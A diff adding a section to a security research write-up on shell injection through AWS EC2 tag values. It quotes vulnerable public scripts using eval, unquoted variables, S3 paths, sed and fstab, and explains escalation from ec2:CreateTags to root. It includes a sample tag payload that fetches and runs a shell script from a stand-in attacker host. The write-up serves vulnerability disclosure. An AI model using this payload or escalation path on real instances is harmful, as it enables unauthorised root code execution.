@@ -527,7 +527,91 @@ CodeBuild fetches SSM parameters as environment variables, then uses them **unqu
 
 Tag values allow nearly arbitrary Unicode characters (up to 256 chars), including `$`, backticks, `;`, `|`, `()`, spaces, and more. Tags are commonly read by automation scripts (user-data, Lambda, CI/CD) and used in shell commands.
 
-*Findings pending — research in progress.*
+**Key insight:** The `ec2:CreateTags` permission is often granted broadly because it appears low-risk. However, when combined with any of the patterns below, it becomes a **privilege escalation vector** — an IAM principal with only `ec2:CreateTags` can achieve root-level code execution on instances that consume those tags (user-data scripts run as root).
+
+#### 7.2a `aws-samples/single-ec2-cdk` — Unquoted Tag in `hostnamectl` and Route53 (HIGH)
+
+**Repo:** [aws-samples/single-ec2-cdk](https://github.com/aws-samples/single-ec2-cdk/blob/main/userdata/user_script.sh)
+
+```bash
+HOST=`aws ec2 describe-tags --filters "Name=resource-id,Values=$INSTANCE_ID" \
+  "Name=key,Values=nickName" | jq -r .Tags[].Value`
+DOMAIN=`aws ec2 describe-tags --filters "Name=resource-id,Values=$INSTANCE_ID" \
+  "Name=key,Values=domainName" | jq -r .Tags[].Value`
+
+hostnamectl set-hostname $HOST.$DOMAIN
+```
+
+`$HOST` and `$DOMAIN` are unquoted. A tag value like `foo$(curl attacker.com/shell.sh|bash)` would be executed by the shell when passed to `hostnamectl`. The variables are also used to construct Route53 DNS records.
+
+#### 7.2b `eval $(ec2-tags)` — The Most Dangerous Pattern (CRITICAL)
+
+Multiple widely-copied patterns convert EC2 tags into shell `export` statements and then `eval` or `source` them:
+
+**[ambakshi/ec2-tags](https://github.com/ambakshi/ec2-tags)** — documented usage:
+```bash
+eval "$(ec2-tags -i -s -e)"
+source <(ec2-tags -i -s -e)
+```
+
+**[Gist: marcellodesales](https://gist.github.com/marcellodesales/a890b8ca240403187269):**
+```bash
+for key in $(echo $tags | /usr/bin/jq -r ".[][].Key"); do
+    value=$(echo $tags | /usr/bin/jq -r ".[][] | select(.Key==\"$key\") | .Value")
+    export $key="$value"
+done
+```
+
+**[Gist: sysboss](https://gist.github.com/sysboss/e2a119a391da8f9f3e660289aefd8ab7):**
+```bash
+for i in $(seq 0 ${COUNT}); do
+    declare "$(getTagKey $i)=$(getTagValue $i)"
+done
+```
+
+Any tag value containing shell metacharacters is executed as code. A tag **key** like `PATH` or `LD_PRELOAD` would overwrite critical environment variables. The `declare`/`export` patterns don't sanitize `$()`, backticks, or semicolons.
+
+This pattern is promoted in [Andrei Maksimov's widely-read Medium article](https://andreimaksimov.medium.com/how-to-put-aws-ec2-tags-to-environment-variables-45b5d2a15b88) as a recommended practice.
+
+#### 7.2c Tag Values in S3 Paths — Download and Execute Arbitrary Objects (HIGH)
+
+**[Gist: daviddyball](https://gist.github.com/daviddyball/a7d1443964030f2c3730):**
+
+```bash
+ROLE=$(echo "$TAGS" | grep Role | awk '{print $3}')
+ENVIRONMENT=$(echo "$TAGS" | grep Environment | awk '{print $3}')
+
+aws s3 cp s3://my-configs/${ENVIRONMENT}/${ROLE}/bootstrap.sh \
+  /root/${ENVIRONMENT}_${ROLE}_bootstrap.sh
+chmod +x /root/${ENVIRONMENT}_${ROLE}_bootstrap.sh
+/root/${ENVIRONMENT}_${ROLE}_bootstrap.sh
+```
+
+Tag values are interpolated unquoted into an S3 path, the downloaded file is made executable, and **executed**. A tag value containing `../` could traverse paths to download an attacker-controlled S3 object.
+
+#### 7.2d Tag Values in `sed` — File Content Injection (MEDIUM)
+
+**[calvintrobinson/AWS-Hostname-Change-Based-on-Tag-Scripts](https://github.com/calvintrobinson/AWS-Hostname-Change-Based-on-Tag-Scripts/blob/master/LINUX-AWS-Hostname-from-Tag.sh):**
+
+```bash
+HN=$(aws ec2 describe-tags ... --output=text | cut -f5)
+sed -i 's/'"$hostn/$HN"'/g' $hostnamefile
+sed -i 's/'"$hostn/$HN"' /g' $hostsfile
+```
+
+Tag value `$HN` is interpolated into a `sed` substitution pattern. A value containing `/` or `&` characters breaks or hijacks the sed command, enabling content injection into `/etc/hostname` or `/etc/hosts`.
+
+#### 7.2e Tag Values in fstab — Mount Point Injection (MEDIUM)
+
+**[blog.hcf.dev](https://blog.hcf.dev/article/2018-08-22-aws-user-data-script):**
+
+```bash
+mntpt=$(ec2-get-tag-value ${volume} mntpt)
+mkdir -p ${mntpt}
+echo "UUID=${uuid} ${mntpt} ${fstype} defaults 0 2" >> /etc/fstab
+```
+
+Tag values appended directly into `/etc/fstab`. A `mntpt` value containing newlines could inject additional fstab entries. The unquoted `mkdir -p ${mntpt}` is subject to word splitting and globbing.
 
 ### 7.3 S3 Object Keys
 
